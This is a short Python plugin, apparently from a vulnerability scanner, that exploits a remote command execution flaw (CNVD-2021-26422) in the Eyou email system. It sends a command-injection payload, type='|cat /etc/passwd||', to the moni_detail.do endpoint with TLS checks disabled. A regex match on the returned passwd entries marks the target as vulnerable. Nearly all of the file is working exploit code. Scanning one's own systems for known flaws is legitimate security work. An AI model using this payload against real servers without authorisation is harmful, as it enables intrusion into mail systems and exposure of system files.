#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '亿邮电子邮件系统 moni_detail.do 远程命令执行 CNVD-2021-26422',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Cache-Control': 'max-age=0',
      'Upgrade-Insecure-Requests':'1',
      'Content-Type':'application/x-www-form-urlencoded',
      }
  target = '/webadm/?q=moni_detail.do&action=gragh'
  data = "type='|cat /etc/passwd||'"
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and re.search(r'root:.*?:[0-9]*:[0-9]*:',res.text,re.S):
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret